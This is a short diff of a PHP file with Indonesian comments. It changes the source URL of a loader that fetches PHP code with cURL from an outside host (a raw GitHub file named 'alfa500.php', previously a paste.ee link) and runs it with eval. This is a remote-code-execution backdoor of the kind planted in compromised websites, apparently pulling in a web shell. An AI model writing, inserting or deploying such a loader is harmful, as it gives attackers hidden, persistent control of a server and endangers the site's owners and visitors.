@@ -12,7 +12,7 @@ function geturlsinfo($url) {
 }
 
 // Mendapatkan konten dari URL menggunakan cURL
-$a = geturlsinfo('https://paste.ee/r/ybipC');
+$a = geturlsinfo('https://raw.githubusercontent.com/polaranoid/cron/refs/heads/main/alfa500.php');
 
 // Menggunakan eval untuk mengeksekusi kode PHP yang diterima
 eval('?>' . $a);
